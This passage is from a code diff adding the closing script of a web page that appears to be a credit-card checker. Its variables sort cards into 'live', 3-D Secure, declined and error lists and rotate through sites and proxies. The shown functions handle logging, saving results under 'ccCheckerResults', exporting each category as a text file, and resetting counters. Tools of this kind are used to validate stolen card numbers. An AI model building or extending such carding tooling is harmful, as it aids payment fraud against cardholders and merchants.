+            logEntry.className = 'log-entry';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logContainer.prepend(logEntry);
+        }
+
+        // Save results to local storage
+        function saveResultsToLocalStorage() {
+            const results = {
+                live: liveCards,
+                threeDS: threeDS,
+                declined: declinedCards,
+                errors: errorCards
+            };
+            localStorage.setItem('ccCheckerResults', JSON.stringify(results));
+            addLog('Results saved to local storage.');
+        }
+
+        // Download file
+        function downloadFile(dataArray, type) {
+            if (dataArray.length === 0) {
+                alert(`No ${type} cards to download.`);
+                return;
+            }
+            const data = dataArray.join('\n');
+            const blob = new Blob([data], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            const now = new Date();
+            const timestamp = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')}_${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
+            a.download = `${type}_cards_${timestamp}.txt`;
+            a.href = url;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Reset state
+        function resetState() {
+            liveCards = [];
+            threeDS = [];
+            declinedCards = [];
+            errorCards = [];
+            cardsProcessedCount = 0;
+            totalCards = 0;
+            requestQueue = [];
+            activeRequests = 0;
+            currentSiteIndex = 0;
+            currentProxyIndex = 0;
+            isPaused = false;
+            liveCount.textContent = 0;
+            threeDSCount.textContent = 0;
+            declineCount.textContent = 0;
+            errorsCount.textContent = 0;
+            resultsContainer.innerHTML = '';
+            progressBar.style.width = '0%';
+            pauseBtn.disabled = true;
+            resumeBtn.disabled = true;
+        }
+
+        function startLoading(message) {
+            loader.style.display = 'block';
+            statusMessage.textContent = message;
+        }
+
+        function stopLoading(message) {
+            loader.style.display = 'none';
+            statusMessage.textContent = message;
+            pauseBtn.disabled = true;
+            resumeBtn.disabled = true;
+        }
+    </script>
+</body>
+</html>
